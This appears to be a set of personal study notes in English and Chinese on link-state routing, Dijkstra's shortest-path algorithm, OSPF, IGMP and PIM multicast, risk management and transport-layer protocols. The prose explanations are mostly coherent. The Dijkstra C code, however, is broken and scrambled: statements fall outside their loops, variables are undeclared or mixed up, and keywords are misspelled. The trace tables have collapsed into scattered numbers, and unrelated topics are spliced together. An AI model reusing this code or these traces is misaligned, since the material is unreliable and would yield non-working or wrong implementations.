In practice, each switch computes its routing table directly from the LSPs it has collected using a realization of Dijkstra’s algorithm called the forward search algorithm.
Specifically, each switch maintains two lists, Tentative 暂定的 and Confirmed. Each of these lists contains a set of entries of the form (Destination, Cost,
NextHop).
The algorithm works as follows:
1. Initialize the Confirmed list with an entry for myself; this entry has a cost of 0.
2. For the node just added to the Confirmed list in the previous step, call it node Next and select its LSP.
3. For each neighbor (Neighbor) of Next, calculate the cost (Cost) to reach this Neighbor as the sum of the cost from myself to Next and from Next to Neighbor.
  - (a) If Neighbor is currently on neither the Confirmed nor the Tentative list, then add (Neighbor, Cost, NextHop) to the Tentative list, where NextHop is the direction I go to reach Next.
  - (b) If Neighbor is currently on the Tentative list, and the Cost is less than the currently listed cost for Neighbor, then replace the current entry with (Neighbor, Cost, NextHop), where NextHop is the direction I go to reach Next.
4. If the Tentative list is empty, stop. Other wise, pick the entry from the Tentative list with the lowest cost, move it to the Confirmed list, and return
to step 2.   Example: network has a range of different edge costs. Table 3.14 traces the steps for building the routing table for node D. We denote the two outputs of D by using the names of the nodes to which they connect, B and C. Note the way the algorithm seems to head off on false leads (like the 11-unit cost path to B that was the first addition to the Tentative list) but ends up with the least-cost paths to all nodes.
The link-state routing algorithm
Nice properties: stabilize quickly, it does not generate much traffic, and it responds rapidly to topology changes or node failures.
On the downside: the amount of information stored at each node (one LSP for every other node in the network) can be quite large (fundamental problems of routing), also cause more general problem of scalability.
The difference between the distance-vector and link-state algorithms: distance-vector: each node talks only to its directly connected neighbors, but it
tells them everything it has learned (i.e., distance to all nodes).
link-state: each node talks to all other nodes, but it tells them only what it knows
for sure (i.e., only the state of its directly connected links).
dijkstra原理:最优子路径存在。假设从S→E存在一条最短路径SE，且该路径经过点A， 那么可以确定SA子路径一定是S→A的最短路径。证明:反证法。如果子路径SA不是最短 的，那么就必然存在一条更短的'SA，从而SE路径也就不是最短，与原假设矛盾。 dijkstra缺点:与此前说过的viterbi不同，此算法能够求出从起点到其余每个结点的最短路 径，所以需要遍历所有的路径和结点，计算复杂度比较大。 dijkstra例子:求从结点0到各个结点的最短路径。 点。S U U=所有结点组成的集合，当U为空的时候算法结束，所有结点最短路径均已找 到。 step2:建立一个数组dist[i]，用于存放起点0到该结点i的最短路径(可能需要更新)。再 建立一个布尔数组s[i](初值均为0)，用于表示该结点是否已经找到最短路径，如已经找 到便不再遍历。
step3:具体执行部分: A:初始点设定。
对于结点0，将其纳入到S集合中，计算与结点0直接相连路径的⻓度， dist[1]=100, dist[2]=30, dist[4]=10，dist[0]=0。 不能直接到达的结点距离为无限大∞，使用dist[3]=99999，方便程序比较大小。 然后使s[0]=1，表示已经遍历过该结点。
B:选取最小dist[i]。
比较dist[1],dist[3],dist[4]的⻓度，最短dist[4]， 将结点4纳入到S，令s[4]=1，表明0到4的最短路径已经找到，值为10。
原因:最优子路径存在原理。由于dist[1],dist[3]均大于dist[4]，所以若选择走经过结点1、 3到达结点4路径，无论如何也不可能找到一条小于直接从结点0到结点4的路径!这个结论 非常非常非常重要，是理解这个算法的关键!后面会反复用到，每一轮循环都要比较并选 取最小的dist[i]。
C:更新dist[i]。现在，我们开始以结点4为中心向外扩展(广度优先)。现在，结点4可 以到达结点3了，也表明从结点0可以通过结点4到达结点3了。至于要更新dist[i]的原因如 下图: 在第一次选择中，我们纳入了起点A，然后由于dist[C]=6<dist[B]=20，我们又纳入了C 点。这时，我们发现我们还可以通过C点到达B点，所以我们必须比较dist[B]与dist[C]+| CB|的大小。这以下这个例子中，显然6+7=13<20，所以dist[B]需要从20更新成13。
每纳入一个新的结点，我们都需要比较由这个结点新扩展出来结点所生成路径与原来路径
的⻓度。  已知最短路程的顶点集合 P: final[ i ] = 1 未知最短路径的顶点集合 Q: final[ i ] = 0
在集合 Q 的所有顶点中选择一个离源点 s 最近的顶点 u(即 dis[u]最 小)加入到集合 P。并考察所有以点 u 为起点的边，对每一条边进行 松弛操作。例如存在一条从 u 到 v 的边，那么可以通过将边 u->v 添 加到尾部来拓展一条从 s 到 v 的路径，这条路径的⻓度是 dis[u] +e[u][v]。如果这个值比目前已知的 dis[v]的值要小，我们可以用新 值来替代当前 dis[v]中的值。
 #include <stdio.h>
int main()
{
int e[10][10], dis[10], book[10], i,j,n,m, t1, t2, t3,
u, v, min;
int inf=99999999; //用inf(infinity的缩写)存储一个我们认为的正无穷值
//读入n和m，n表示顶点个数，m表示边的条数 scanf("%d %d",&n,&m);
//初始化
for(i=1;i<=n;i++)
    for(j=1;j<=n;j++)
        if(i==j) e[i][j]=0;  else e[i][j]=inf; //读入边
for(i=1;i<=m;i++)
{
    scanf("%d %d %d",&t1,&t2,&t3);
    e[t1][t2]=t3;
}
//初始化dis数组，这里是1号顶点到其余各个顶点的初始路程 for(i=1;i<=n;i++)
    dis[i]=e[1][i];
//final数组初始化 for(i=1;i<=n;i++)
final[i]=0; final[1]=1; //1已知
//Dijkstra算法核心语句 for(i=1;i<=n-1;i++)
{
//找到离1号顶点最近的顶点
    min=inf;
    for(j=1;j<=n;j++)
    {
        if(book[j]==0 && dis[j]<min)
        {
min=dis[j];
u=j; }
}
book[u]=1;
for(v=1;v<=n;v++)  {
    if(e[u][v]<inf)
    {
        if(dis[v]>dis[u]+e[u][v])
} }
}
//输出最终的结果 for(i=1;i<=n;i++)
    printf("%d ",dis[i]);
getchar();
dis[v]=dis[u]+e[u][v];
getchar();
return 0; }
 #Define MAXVEX 9
#Define INFINITY 65535
Typedef int *D.Patharc[MAXVEX]; //上一个最优路标 Tyoedef int *P.ShortPathTable[MAXVEX]; //最短权值和
Void ShortestPath (Mgraph G, int V0,Patharc *P,
ShortPathTable *D)
{
    int v, w, k, min;
//上一个点，下一个点，是否最优，当前权值和 Int final[MAXVEX];  //Fianl[w]=1 表示已经找到顶点V0到Vw的最短路径
//初始化数据
For (v=0; v < 总顶点数; v++)
{
Final [v] = 0;
(*D)[V] = dis [V0][v]; (*P)[V] = 0;
//Fianl[w]=1 表示最短
//最短权值和 //上一个最优路标
}
(*D)[V] = dis [V0] = 0; //V0至V0路径为0
Final[V0] = 1;
//开始主循环 For v=1
{
Min = infinity;
For (w=0; w< n, w++) {
//V0是最优点
If ( ! final[w] && (*D)[w]<min ) {
K = w;
Min = (*D)[w]; }
}
For (w=0; w<n;w++) {
If ( ! final[w] && ( min+dis[k][w] < dis[w] ) )
{
(*D)[w]=min+dis[k][w];
(*P)[w]=k; } }
For v=1
1.
{ Min = infinity;
For w=0;
{
If ( ! final[0] && (*D)[0]<min ). //final[0] = 1, (*D)[0]=0 { K = 0; min=0;}
} }
2.
Min = infinity;
For w=1;
{ If ( ! final[1] && (*D)[1]<min ).
{ K=1;min= (*D)[1]=1; } } Final[1] = 1
For w=0;
{If ( ! final[0] && ( min+dis[1][0] < dis[0] ) )} //
For w=1; //fianl[1]=1，进不去 {If ( ! final[1] && ( min+dis[1][1] < dis[1] ) )}
For w=2;
//求出V0-V1最短路径1 //final[1] = 0,(*D)[1]=1
//fianl[0]=1，没有必要
{ 0 1+dis[1][2]=4 < dis[2]=5 If ( ! final[2] && ( min+dis[1][2] < dis[2] ) )
{(*D)[2]=4; (*P)[2]=1; } }
For w=3;
{ 0 1+dis[1][3]=8 < dis[3]=N
 If ( ! final[3] && ( min+dis[1][3] < dis[3] ) )
{(*D)[3]=8; (*P)[3]=1; } }
For w=4;
{ 0 1+dis[1][4]=6 < dis[4]=N
If ( ! final[4] && ( min+dis[1][4] < dis[4] ) ) {(*D)[4]=6; (*P)[4]=1; } }
For w=5; //dis[1][5]=N，不直接和V1相连 { 0 1+dis[1][5]=N # dis[5]=N
If ( ! final[5] && ( min+dis[1][5] < dis[5] ) ) For w=6;
{If ( ! final[6] && ( min+dis[1][6] < dis[6] ) ) For w=7;
{If ( ! final[7] && ( min+dis[1][7] < dis[7] ) ) For w=8;
{If ( ! final[8] && ( min+dis[1][8] < dis[8] ) ) }
3.
Min = infinity;
For w=2; //求出V0-V2最短路径 { 0 4 < infinity. //0&&ture
If ( ! final[2] && (*D)[2]<min ). { K=2;min= (*D)[2]=4; } }
Final[2] = 1
For w=0; //fianl[0]=1，没有必要 { If ( ! final[0] && ( min+dis[2][0] < dis[0] ) )} //
For w=1; //fianl[1]=1，进不去
 { If ( ! final[1] && ( min+dis[2][1] < dis[1]) )}
For w=2; //fianl[2]=1，进不去
{ If ( ! final[2] && ( min+dis[2][2] < dis[2]) )}
For w=3; //dis[2][3]=N，不直接和V3相连 { 0 4+dis[2][3]=N # dis[3]=8
If ( ! final[3] && ( min+dis[2][3] < dis[3] ) )}
For w=4;
{ 0 4+dis[2][4]=5 < dis[4]=6
If ( ! final[4] && ( min+dis[2][4] < dis[4] ) ) {(*D)[4]=5; (*P)[4]=2; } }
For w=5;
{ 0 4+dis[2][5]=11 < dis[5]=N
If ( ! final[5] && ( min+dis[1][5] < dis[5] ) ) {(*D)[5]=11; (*P)[5]=2; } }
For w=6; //dis[2][3]=N，不直接和V6相连
{If ( ! final[6] && ( min+dis[2][6] < dis[6] ) )
For w=7; //dis[2][3]=N，不直接和V7相连
{If ( ! final[7] && ( min+dis[2][7] < dis[7] ) )
For w=8; //dis[2][3]=N，不直接和V8相连
{If ( ! final[8] && ( min+dis[2][8] < dis[8] ) )
4.
Min = infinity;
For w=3; //求出V0-V2最短路径 { 0 8 < infinity. //0&&ture
If ( ! final[3] && (*D)[3]<min ). { K=3;min= (*D)[3]=8; } }
 Final[3] = 1
For w=0; //fianl[0]=1，没有必要 { If ( ! final[0] && ( min+dis[3][0] < dis[0] ) )} //
For w=1; //fianl[1]=1，进不去 { If ( ! final[1] && ( min+dis[3][1] < dis[1]) )}
For w=2; //fianl[2]=1，进不去 { If ( ! final[2] && ( min+dis[3][2] < dis[2]) )}
For w=3; //fianl[3]=1，进不去 { If ( ! final[3] && ( min+dis[3][2] < dis[3]) )}
For w=4;
{ 0 8+dis[3][4]=10 # dis[4]=5
If ( ! final[4] && ( min+dis[3][4] < dis[4] ) )
For w=5; //dis[3][5]=N，不直接和V5相连
{ If ( ! final[5] && ( min+dis[3][5] < dis[5] ) )
For w=6; //dis[2][3]=N，不直接和V6相连 { 0 8+dis[3][6]=11 < dis[6]=N
If ( ! final[6] && ( min+dis[3][6] < dis[6] ) ) {(*D)[6]=11; (*P)[6]=3; } }
For w=7; //dis[3][3]=N，不直接和V7相连 {If ( ! final[7] && ( min+dis[3][7] < dis[7] ) )
For w=8; //dis[3][3]=N，不直接和V8相连 {If ( ! final[8] && ( min+dis[3][8] < dis[8] ) )
  W=1, k=1, Final[1] = 1
         F
0D:
1
v0
1
v1
0
v2
0
v3
0
v4
0
v5
0
v6
0
v7
                       v8W= 0
NW=1
*W=2
P
W=3
P
0
*
0
0
1
*
0
0
5
*
4
1
1
N
*
8
1
N
          *
6
1
N
*
N
*
N
     *
         W=2, k=2, Final[2] = 1
          F
D:
W=0
W=1
W=2
W=3
W=4
W=5
p
1
v0
0
*
0
1
v1
1
*
0
1
v2
5
*
1
0
v3
N
*
1
0
v4
N
*
5
2
0
v5
N
*
11
2
0
v6
N
*
0
v7
N
*
0
v8
N
*
          W=3, k=3, Final[3] = 1
          F
D:
W=0
W=1
W=2
1
v0
0
*
1
v1
1
*
1
v2
5
*
1
v3
N
*
0
v4
N
*
0
v5
N
*
0
v6
N
*
0
v7
N
*
0
v8
N
*
                                                                                                                                                                                                                                                                                                                                                                                                                                                      W=3
W=4
W=5
W=5
p
           &&
0
0
1
1
5
2
11
2
11
3
取值为真的条件是，当且仅当两个命题的取值都真时
    #define MAXVEX 9;
#define INFINITY 65535;  typedef int distance[MAXVEX]; //上一个最优路标 typedef int ShortestPathTable[MAXVEX]; //最短权值和
void ShortestPath (Mgraph G, int Na, ShortestPathTable *P, distance *D)
{
int N, n, m, k, min; int final[N];
    //start from Na, 0
for (n=0; n<MAXVEX; n++;) {
final[n] = 0; (*d)[N]=G.arc[N][n]; (*P)[N]=0;
} (*D)[N]==0; final[N]=1;
    //main loop, choose one start point, caculate the best cost
min.
for (n=1; n<MAXVEX; n++;) {
min=INFINITY;
for (w=0; w<MAXVEX; w++;) {
if (! final[w] && (*D)[w]<min)) {
k=w;
                min=(*D)[w];
            }
} }
    //start loop to find the cost from point W to the rest of
point
for (w=0; w<MAXVEX; w++;) {
if (! final[w] && min+dis[k][w]<dis[w]) {
            (*D)[w]= min+dis[k][w];
(*P)[w]=k; }  } }
The Open Shortest Path First Protocol (OSPF)
OSPF:
one of the most widely used link-state routing protocols.
“Open”: open, nonproprietary standard, created under the auspices of the Internet Engineering Task Force (IETF).
“SPF”: an alternative name for link-state routing.
OSPF adds lots features to the basic link-state algorithm:
  - Authentication of routing messages:
  - disperse information from one node to many other nodes, and the entire network can thus be impacted by bad information from one node.
  - For this reason, needs to ensure that all nodes in the protocol can be trusted.
  - Early versions of OSPF used a simple 8-byte password for authentication.
  - Not strong enough to prevent dedicated malicious users, but it alleviates some problems caused by misconfiguration or casual attacks.
  - (A similar form of authentication was added to RIP in version 2).
  - Additional hierarchy:
  - Hierarchy is one of the fundamental tools used to make systems more scalable.   - OSPF introduces another layer of hierarchy into routing by allowing a domain to be partitioned into areas. (a router in a domain does not necessarily need to know how to reach every network within that domain, it may only need to know how to get to the right area). Thus, there is a reduction in the amount of information that must be transmitted to and stored in each node.
  - Load balancing:
  - OSPF allows multiple routes to the same place to be assigned the same cost and will cause traffic to be distributed evenly over those routes
  - making better use of available network capacity.
There are several different types of OSPF messages, but all begin with the same
header.
Version: currently set to 2.
Type: may take the values 1 through 5.
SourceAddr: identifies the sender of the message.
AreaId: a 32-bit identifier of the area in which the node is located.
The entire packet, except the authentication data, is protected by a 16-bit checksum using the same algorithm as the IP header.
Authentication type:
  - 0, no authentication is used.
  - 1, a simple password is used.
  - 2, a cryptographic authentication checksum is used.
Authentication: carries the password or cryptographic checksum.  Five OSPF message types:
Type 1, “hello” message: to notify that it is still alive and connected as described above. (The remaining types are used to request, send, and acknowledge the receipt of link-state messages.)
The basic building block of link-state messages in OSPF is link-state advertisement (LSA).
  - One message may contain many LSAs. We provide a few details of the LSA here.
Like any internetwork routing protocol, OSPF must provide information about how to reach networks.
a router running OSPF may generate: link-state packets that advertise one or more of the networks that are directly connected to that router.
A router connect to another router must advertise: the cost of reaching that router over the link.
These 2 types of advertisements: enable all routers in a domain to determine the cost of reaching all networks in that domain and the appropriate next hop for each network.  Figure 3.35 shows the packet format for a type 1 link-state advertisement. Type 1 LSAs advertise the cost of links between routers.
Type 2 LSAs: used to advertise networks to which the advertising router is connected, (other types are used to support additional hierarchy)
LS Age: like time to live, but it counts up and the LSA expires when the age reaches a defined maximum value.
Type: tells us that this is a type 1 LSA.
In a type 1 LSA, the Link state ID and the Advertising router field are identical. Each carries a 32-bit identifier for the router that created this LSA. a number of assignment strategies may be used to assign this ID, it is essential that it be unique in the routing domain and consistently uses the same router ID.
  - One way to pick a router ID that meets these requirements would be to pick the lowest IP address among all the IP addresses assigned to that router. (Recall that a router may have a different IP address on each of its interfaces.)
LS sequence number: to detect old or duplicate LSAs.
LS checksum: to verify that data has not been corrupted. It covers all fields in the packet except LS Age, (so dont need to recompute checksum every time LS Age is incremented).
The Length: the length in bytes of the complete LSA. Now we get to the actual link-state information.
This is made a little complicated by the presence of TOS (type of service) information. Ignoring that for a moment, each link in the LSA is represented by a Link ID, some Link Data, and a metric.
Link ID & Link Data: identify the link; a common way to do this is use the router ID of the router at the far end of the link as the Link ID and then use the Link Data to disambiguate among multiple parallel links if necessary.
metric: the cost of the link.
Link Type: something about the link—example, if it is a point-to-point link.
The TOS information: allow OSPF to choose different routes for IP packets based on the value in their TOS field.
It is possible to assign different metrics depending on the TOS value of the data.
example:
a link in our network for delay-sensitive traffic, we could give it a low metric for the TOS value representing low delay and a high metric for everything else. OSPF would then pick a different shortest path for those packets that had their TOS field set to that value. It is worth noting that, at the time of
writing, this capability has not been widely deployed. Multicast Routing
- multicast transmission:
◦ multicast sender could send traffic destined for a Class D IP
address, known as a multicast group,
◦ devices on a network wanting to receive that transmission could
join that multicast group.
◦ send that traffic only to devices in a network wanting to receive
that traffic.
- how a client joins a multicast group and how routers route multicast
traffic.
◦
◦ ◦
◦
simultaneously delivering a single stream of information to potentially thousands of corporate recipients and homes. Applications that take advantage of multicast include video conferencing, corporate communications, distance learning, and distribution of software, stock quotes, and news.
Internet Group Management Protocol (IGMP)
- (incorrectly: states that Internet Group Multicast Protocol.)
- The protocol used between clients (like PCs) and routers to let routers know which of their interfaces have multicast receivers attached is
IGMP.
- Although three versions of IGMP exist, only v1 and v2 are in wide-
scale deployment:
- IGMP version 1 (IGMPv1):
◦ When PC wants to join a multicast group, sends an IGMP report
message to its router,
▸ letting the router know it wants to receive traffic for a specific
group.
◦ Every 60 seconds, by default, the router sends an IGMP query
message to determine if the PC still wants to belong to the group.
◦ Two primary protocols used for multicast are Internet Group Management Protocol (IGMP) and Protocol Independent Multicast (PIM).
bandwidth-conserving technology that reduces traffic by ▸ router query: destination address 224.0.0.1, which addresses all IP multicast hosts.
◦ There can be up to a 3-minute delay before a router realizes the receiver left the group.
- IGMP version 2 (IGMPv2): ◦ Similar to IGMPv1,
◦ except
▸ IGMP version 2 can send queries to a specific group.
▸ a receiver can proactively send a leave message when it no
longer wants to participate in a multicast group, allowing
the router to prune its interface earlier than IGMPv1.
- IGMP version 3 (IGMPv3):
◦ Adds a feature called Source-Specific Multicast (SSM):
▸ allows a client to request traffic not only destined for a particular multicast group
▸ And request traffic sourced from a specific server. ▸ Example:
- multiple video servers streaming different video streams, all destined for the same multicast group.
- when a client joined that group, with SSM (supported by IGMPv3), that client could request that it only receive traffic sourced from a specific server.
- This would provide support for multiple multicast sessions while consuming only one Class D IP address.
- basic multicast topology: only PC2 wants to receive the multicast traffic.
◦ PC2 send an IGMP join message to its default gateway.
▸ indicates it wants to belong to the multicast group of 239.1.2.3.
◦ The switch (which the IGMP join message passes) is enabled with the IGMP snooping feature:
▸ allows the switch to eavesdrop on the IGMP join message, determine the multicast group that PC2 wants to join.
▸ when the switch receives traffic from the router destined for 239.1.2.3, will only forward those packets out the port connected to PC2.
◦ When the router receives the IGMP join message from PC2, it knows that it should only forward traffic destined for 239.1.2.3 out the interface on which a IGMP join message was received.
◦ when the multicast source sends a stream of traffic destined for 239.1.2.3, traffic will only forwarded out the router port and the switch port leading to PC2.
Protocol Independent Multicast (PIM)
- Although IGMP allows a multicast receiver to join a multicast group,
◦ still have a need for a multicast routing protocol
◦ routes multicast traffic between multicast-enabled routers.
- The most popular multicast routing protocol is PIM. main purpose is:
◦ to form a multicast distribution tree (the paths over which
multicast traffic flows)
- two modes of operation: PIM dense mode (PIM-DM) and PIM sparse
mode (PIM-SM).
- PIM dense mode (PIM-DM):
◦ source distribution tree:
▸ the optimal path formed between the source router (the router
closest to the multicast sender) and each last-hop router (the router closest to each multicast receiver) in multicast network.
◦ the path over which the multicast packets flow:
▸ PIM-DM Flooding:
- multicast traffic from the multicast source is initially
flooded throughout the entire network.
- traffic will be sent to routers not needing the multicast
traffic.
- consume bandwidth on the links between routers.
▸ PIM-DM Pruning:
- After initial flooding, if a router interface receives the
multicast traffic, and that traffic is not needed by the router (or if the traffic is needed by the router, but on a different interface),
- the router interface sends a prune message to its neighboring router, asking that it be pruned off of the source distribution tree.
▸ After sending prune messages, source distribution tree formed between the source router and the last-hop router.
- benefit:
◦ an optimal path is formed between the source router and each last-
hop router. - drawback:
◦ a network must undergo the flood and prune behavior to form the optimal distribution tree. ◦ after the optimal distribution tree is formed, the flooding and pruning repeats every 3 minutes.
◦ The periodic flooding of traffic might impact the network.
- PIM sparse mode (PIM-SM).
◦ shared distribution tree.
▸ does not initially form an optimal path.
▸ a multicast source sends traffic directly to another router /
rendezvous point (RP).
◦ When another router in the multicast network wants to join the
multicast distribution tree (received an IGMP join message from a client), that last-hop router sends a join message to the RP to join the shared distribution tree,
◦ The tree is called a shared distribution tree, because all last-hop routers (routers with downstream multicast receivers) send join messages to the same RP.
- benefit:
◦ the flood and prune behavior of PIM-DM is avoided.
- drawback:
◦ a suboptimal distribution tree might be formed.
◦ shortest path tree (SPT) switchover feature:
▸ after a last-hop router receives the first multicast packet from the multicast source, it can see the IP address of the multicast source.
▸ based on its unicast routing table, form an optimal distribution tree and then prune off the branch of the tree connecting it to the RP.
◦ With the addition of the SPT switchover feature:
▸ PIM-SM is the preferred approach to forming a multicast
distribution tree,
▸ gives you an optimal path from the source router to each last-
hop router,
▸ avoids the flood and prune behavior of PIM-DM.
Define Key Terms
- ARP, TTL,
- default static route????, next-hop,
- routed protocol, routing protocol,
- administrative distance, metric, - IGP, EGP,
- distance-vector, link-state, LSA, link-state advertisements (LSA), hold-
down timer,
- split horizon, poison reverse, •
- RIP, OSPF, IS-IS, EIGRP, BGP, •
- route redistribution, •
- NAT, DNAT, SNAT,
- PAT, •
- IGMP, PIM ch3 Risk management
Business Continuity Planning
Assess risks to business processes
identify critical systems and components
Minimize impact from disruptions
Maintain continuity of being able to perform mission-critical business
tasks
4 Main steps:
Project scope and planning Business impact assessment Continuity planning Approval and implementation
BCP Team Selection
Needs members from every department/division
Include members from:
IT & Senior management & Legal & Security
 Senior management and BCP
 Resource Requirements
BCP development
BCP testing, training, and maintenance
BCP implementation
Mostly personnel but may include IT and physical resource allocation  Legal and Regulatory Requirements
Federal, state, and local laws or regulations Emergency services
Industry regulations
Country-specific laws
Service-level agreements
Legal and regulation requirements  Business Impact Assessment
Quantitative decision making vs. qualitative decision making  Identify priorities Identify risk Assess likelihood Assess impact Prioritize resources
Identify Priority
Small company may not have a lot budge.
Critical prioritization of business processes Assess by department, then organization
Assign an AV (asset value) to each process Determine MTD (maximum tolerable downtime) Choose an RTO (recovery time objective)    Risk management
Risk : possibility of suffering loss or potential future harm that might occur due to some present action.
2 forms: natural risks and man-made risks Risk measurement: 1. Probability: a measure of the likelihood that a threat will occur
2. Impact: a measure of the loss that occur when threat is realized.
3. Risk exposure: helps to measure the magnitude of a risk
Types of risks
Technical risk: includes problem with languages, project size, project functionality
Management risk: includes lack of management experience and lack of planning
Financial risk: includes cash flow, capital and budget issues
Project Risks: affect project schedule or resources
Product Risks: affect product quality or performance of software Personnel risk: includes staffing lags, experience & training problems
Risk Management
A process for minimizing the risks
Risk management activities:
1. Asses risk: estimate the impact of the risk
2. Plan for risk mitigation: addressing or mitigating each & every risk, and produce a plan for implementing it
3. Mitigate risk: identifies the risk & tracking the plan to completion.
Risk Identification
Inventory-specific risks Natural and man-made Logical and physical and social Don’t overlook the cloud
Get input from all departments
Risk identification
2 forms: natural risks and man-made risks
  Risk management framework
3 phases: Prepare, perform, and sustain & improve risk management
 Inputs: used by a phase to produce an output Outputs: the results that can be produced by a phase Constraints: items that restrict the execution of a phase and its activities Resources: items that are used while execution of a phase and its
activities
Business impact and the cloud
Likelihood Assessment
 Determine frequency of occurrence
Establish an ARO (annualized rate of occurrence) Based on history, experience, and experts
  4 The Transport Layer
on top of the network layer
supports communication between machines and processes.
Reponsible for communication between host computer and verifying that both the sender and receiver are ready to initiate the data transfer.
- messages are taken from upper layers (Layers 5–7), encapsulated into segments for transmission to the lower layers (Layers 1–3). - data streams coming from lower layers are decapsulated and sent to Layer 5 (the session layer), or some other upper layer, depending on the protocol.
- Function:
  - the network layer & transport layer: ensure reliability of
communication, guaranteeds the link between stations.
  - Transport Layer: aurantees the actual delivery of data.
Extended addressing capability is achieved in the transport layer:
- viewing each machine (own one IP address) as having a collection of ports,
- each port can be the source or destination port for communication with a
port on another machine.
Indeed, the transport layer protocols for the Internet specify 16-bit source and destination port numbers in their headers.
- Each port is associated with a certain type of service offered by a host.
Two primary protocols operate at the transport layer for the Internet:
- Transmission Control Protocol (TCP)
- User Datagram Protocol (UDP).
TCP:
- more sophisticated 老练的 of these two and was defined together with IP as one of the original protocols for the Internet (refer to Internet protocols as “TCP/IP .”)
- TCP is used for some of the most fundamental operations of the Internet.
- The main extra feature of TCP is that:
  - connection oriented 导向的 transport protocol.
  - provides a reliable stream of bytes between two communicating
parties with a guarantee that information arrives intact and in order.
  - If a packet in such a stream is lost, TCP guarantees that it will be
resent, no loss of data.
  - preferred protocol for transfer files, web pages, and email.
UDP
- provides a best-effort communication channel between two ports.
- It is used primarily for applications where communication speed is more important than completeness, like voice-over-IP conversation, where short drops are acceptable (lost packet), but not long pauses (waiting for a lost packet to be resent).
- A connectionless transport protocol.
Novell’s Sequenced Packet Exchange (SPX): (less popular Layer 4 protocol)
- Similar to the TCP/IP stack of protocols, Novell’s solution was the IPX/SPX
stack of protocols.
- However, most modern Novell networks rely on TCP/IP rather than IPX/
SPX.
- Microsoft introduced its own implementation of Novell’s IPX/SPX, named
NWLink IPX/SPX.
Congestion control VS Flow control
Flow control: end-to-end issue
- preventing senders from over-running the capacity of receivers.
Congestion control: hosts and networks interact
- preventing too much data from being injected into the network,
thereby causing switches or links to become overloaded.
Stop and Wait Protocol
After transmitting one frame
- the sender waits for an acknowledgement before transmitting the next
frame.
- If the acknowledgement does not arrive after a certain period of time,
the sender times out and retransmits the original frame 4 different scenarios for the stop-and-wait algorithm.
(a) The ACK is received before the timer expires;
(b) the original frame is lost; (c) the ACK is lost;
(d) the timeout fires too soon
 If the acknowledgment is lost or delayed:
The sender times out and retransmits the frist frame, but the receiver
may think that it is the next frame correctly received and
acknowledged the first frame again.
Then, duplicate copies of frames will be delivered How to solve this
■ Use 1 bit sequence number (0 or 1)
■ When the sender retransmits frame 0, the receiver can determine that it is seeing a second copy of frame 0 rather than the frame 1,
therefore can ignore it (the receiver still acknowledges it, in case the first acknowledgement was lost)
 The sender has only one outstanding frame on the link at a time ■ This may be far below the link’s capacity
Example:
1.5 Mbps link with a 45 ms RTT (Round-Trip Time)
Link capacity: bandwidth x delay = SWS
  - = 1.5 x 45
  - = 67.5 Kb, approximately 8 KB
As sender can send only one frame per RTT, assume frame size of 1 KB
Maximum Sending rate:   - = 1 x 1024 x 8 / 0.045
  - = 182 Kbps
  - about one-eighth of the link’s capacity
■ To use the link fully, then sender should transmit up to 8 frames before having to wait for an acknowledgement
End-to-End Issues
how TCP addresses these and other complications.
First, the sliding window algorithm runs over a single physical link that connects the same two computers, TCP supports logical connections between processes that run on any two computers in the Internet.
TCP needs an explicit connection establishment phase during which the two sides of the connection agree to exchange data with each other. dial up rather than have a dedicated phone line.
TCP also has an explicit co nnection teardown phase.
Second, single physical link that connects the same two computers has a fixed round-trip time
(RTT), TCP connections are likely to have widely different round-trip times.
Variations in the RTT are possible for a single TCP connection that lasts only a few minutes,
and for different location.
What this means to the sliding window algorithm is that the timeout mechanism that triggers retransmissions must be adaptive. (Certainly, the timeout for a point-to-point link must be a set- table parameter, but it is not necessary to adapt this timer for a particular pair of nodes.)
Third, packets may be reordered as they cross the Internet, but this is not possible on a point-to- point link where the first packet put into one end of the link must be the first to appear at the other end.
For TCP, the sliding window algorithm can reorder packets correctly using the sequence number.
The real issue is how far out of order packets can get or, how late a packet can arrive at the destination.
In the worst case, a packet can be delayed in the Internet until the IP time to live (TTL) field expires, the packet is discarded (and hence there is no danger of it arriving late).
TCP assumes each packet has a maximum segment lifetime (MSL),
The current recommended setting is 120 seconds.
TCP has to be prepared for very old packets to suddenly show up at the receiver, potentially confusing the sliding window algorithm.
Fourth, the computers connected to a point-to-point link are generally engineered to support the link.
example, if a link’s delay × bandwidth product is 8 KB
  - a window size is allow up to 8 KB of data to be unacknowledged at a given time.
  - the computers at either end of the link have the ability to buffer up to 8 KB of data.
Any one host can potentially support hundreds of TCP connections at the same time. TCP must learn what resources (like buffer space) the other side is able to apply to the connection. flow control issue. Fifth, the transmitting side of a directly connected link cannot send any faster than the bandwidth of the link allows, and only one host is pumping data into the link, it is not possible to unknowingly congest the link. the load on the link is visible in the form of a queue of packets at the sender.
In contrast, the sending side of a TCP connection has no idea what links will be traversed to reach the destination.
example, the sending machine might be directly connected to a relatively fast Ethernet 100 Mbps, but somewhere out in the middle of the network, a 1.5-Mbps T1 link must be traversed.
to make matters worse, data being generated by many different sources might be trying to traverse this same slow link. This leads to the problem of network congestion. Protocols
Connection-oriented protocol
- Provides a reliable connection stream between two nodes
  - Protocols operate by acknowledging / confirming ever connection
request or transmission.
  - Overhead is more and the performance is less.
- Consists of set up, transmission, and tear down phases
- Creates virtual circuit-switched network
- E.g: transmission control protocol (TCP)
Connectionless protocol
- Do not require an acknowledge:
  - Faster, lack of requirement.
- Sends data out as soon as there is enough data to be transmitted
- E.g: user datagram protocol (UDP)
Transmission Control Protocol (TCP)
A transport layer protocol
- guaranteeing reliable data transfer
- delivery messages in order
- distinguish data for multiple concurrent applications on the same host.
- Most popular application protocols, like WWW, FTP and SSH are built on top of TCP
If a process needs to send a complete file to another computer - do the work of chopping it into IP packets
  - sending them to the other machine
  - Double-checking that all the packets made it intact 完整的
  - resending any that were lost
- the process simply delegate the entire transfer to TCP.   - TCP takes care of all details.
  - provides connection-oriented traffic (guaranteed delivery).   - by using sequence and acknowledgment numbers.
  - provide flow control
  - sequencing
  - handle startups and shutdowns.
  - TCP uses a three-way handshake
  - To start a TCP session, the client sends a SYN (synchronize)
packet.
  - The server responds with a SYN/ACK (synchronize/
acknowledge) packet,
  - the client completes the third part of the handshake with an
ACK packet to establish the connection.
   - TCP Features
 - Connection oriented
- Reliable delivery
  - provides reliablity by requiring positive acknowledegments of delivery
- Maintains order
  - guarantees order with sequence numbers
- Error checking
  - privides error checking with checksums TCP session: starts by establishing a communication connection between sender and receiver.
- Once connection created, the parties communicate over the established channel.
- TCP ensures reliable transmission by using sequence number (three-way handshake)
  - Each subsequent transmission features an incremented sequence number,
  - so that each party is aware when packets arrive out of order or not at all.
 ⁃
- Congestion 拥􏰙 Control:
